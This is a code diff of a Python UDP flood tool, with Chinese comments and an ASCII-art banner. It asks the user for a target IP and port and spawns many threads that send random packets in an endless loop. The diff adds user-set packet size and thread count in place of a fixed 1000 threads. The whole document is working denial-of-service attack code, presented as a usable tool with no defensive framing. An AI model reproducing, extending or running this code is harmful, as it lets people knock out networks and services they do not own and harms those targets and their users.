@@ -1,12 +1,8 @@
-import sys  
-import os  
-import time  
 import socket  
+import os  
 import threading  
-from datetime import datetime  
+import time  
   
-# 打印程序标题 
-
 print(r"""
 
 ___  ____   ___  ____         __  __           __            ____   ___ ____  _  _   
@@ -28,19 +24,17 @@ ___  ____   ___  ____         __  __           __            ____   ___ ____  _ 
 """)
 
 
-  
 # 创建UDP套接字  
 def create_socket(target_ip, target_port):  
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
     sock.settimeout(1)  # 设置超时时间，防止套接字阻塞  
-    return sock, target_ip, target_port  
+    return sock  
   
 # UDP洪水攻击函数  
-def udp_flood(sock, target_ip, target_port):  
+def udp_flood(sock, target_ip, target_port, data_size):  
+    random_data = os.urandom(data_size)  # 生成指定大小的随机数据  
     while True:  
         try:  
-            # 生成随机数据  
-            random_data = os.urandom(9999)  
             sock.sendto(random_data, (target_ip, target_port))  
             print(f"已向 {target_ip}:{target_port} 发送数据包")  
         except socket.error as e:  
@@ -50,19 +44,19 @@ def udp_flood(sock, target_ip, target_port):
   
 # 主函数  
 def main():  
-    # 获取目标IP和端口  
     target_ip = input("目标IP：")  
     target_port = int(input("端口号："))  
+    data_size = int(input("数据包字节大小："))  # 用户输入数据包字节大小  
+    num_threads = int(input("线程数："))  # 用户输入线程数  
   
-    # 创建套接字和线程列表  
     sockets = []  
     threads = []  
   
     # 创建多个套接字和线程  
-    for i in range(1000):  # 创建1000个线程  
-        sock, target_ip, target_port = create_socket(target_ip, target_port + i)  
+    for i in range(num_threads):  
+        sock = create_socket(target_ip, target_port)  
         sockets.append(sock)  
-        t = threading.Thread(target=udp_flood, args=(sock, target_ip, target_port))  
+        t = threading.Thread(target=udp_flood, args=(sock, target_ip, target_port, data_size))  
         threads.append(t)  
         t.start()  
   
